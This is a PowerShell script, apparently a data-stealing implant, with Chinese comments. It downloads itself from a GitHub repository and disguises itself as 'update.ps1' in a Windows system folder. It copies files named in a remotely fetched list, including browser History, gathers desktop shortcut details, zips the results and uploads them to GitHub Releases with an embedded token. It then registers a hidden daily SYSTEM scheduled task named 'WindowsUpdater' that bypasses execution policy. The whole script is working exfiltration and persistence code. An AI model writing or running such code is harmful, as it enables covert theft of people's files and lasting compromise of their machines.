# install.ps1 - 下载自身并注册计划任务 + 上传指定文件
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing

"[INSTALL EXECUTED] $(Get-Date -Format u)" | Out-File "C:\install_debug.txt" -Append

# ========== CONFIG ==========
$token = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # ✅ 请替换为你的 GitHub Token
$repo = "drftghy/backup-files"
# ============================

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# STEP 1: Load path list
try {
    $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    "❌ Failed to load upload-target.txt: $($_.Exception.Message)" | Out-File "C:\upload_log.txt" -Append
    return
}

# STEP 2: Copy files
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"

    if (-not (Test-Path $path)) { continue }
    $dest = Join-Path $tempRoot $name

    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
    } catch {
        "❌ Failed to copy $path: $($_.Exception.Message)" | Out-File "C:\upload_log.txt" -Append
    }
}

# STEP 3: Extract desktop shortcuts
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""
    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n-----------`n"
    }
    $lnkReport | Out-File -FilePath "$tempRoot\lnk_info.txt" -Encoding utf8
} catch {
    "⚠️ Failed to extract .lnk info: $($_.Exception.Message)" | Out-File "C:\upload_log.txt" -Append
}

# STEP 4: Archive
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
} catch {
    "❌ Compress failed: $($_.Exception.Message)" | Out-File "C:\upload_log.txt" -Append
    return
}

# STEP 5: Create GitHub Release
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file package from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
} catch {
    "❌ Create release failed: $($_.Exception.Message)" | Out-File "C:\upload_log.txt" -Append
    return
}

# STEP 6: Upload file
try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
} catch {
    "❌ Upload failed: $($_.Exception.Message)" | Out-File "C:\upload_log.txt" -Append
    return
}

# STEP 7: Cleanup
try {
    Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
} catch {}

# STEP 8: Register Scheduled Task (2AM daily)
$taskName = "WindowsUpdater"
$taskDescription = "Daily file package task"
$scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"

try {
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At 2:00am
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
} catch {
    "⚠️ Scheduled task failed: $($_.Exception.Message)" | Out-File "C:\upload_log.txt" -Append
}
